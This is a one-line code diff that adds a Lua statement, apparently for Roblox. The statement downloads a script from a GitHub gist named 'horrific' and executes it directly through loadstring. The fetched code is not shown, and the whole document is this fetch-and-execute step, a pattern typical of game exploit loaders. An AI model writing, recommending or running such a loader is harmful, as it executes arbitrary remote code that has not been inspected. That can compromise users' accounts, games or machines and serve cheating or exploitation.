@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet("https://gist.githubusercontent.com/RavyarTheBest/b0f2640392a6c107f2dc159d00f3ab40/raw/f0fc6c0906ee035edae1bb5248d1b2f6c20908da/horrific", true))()
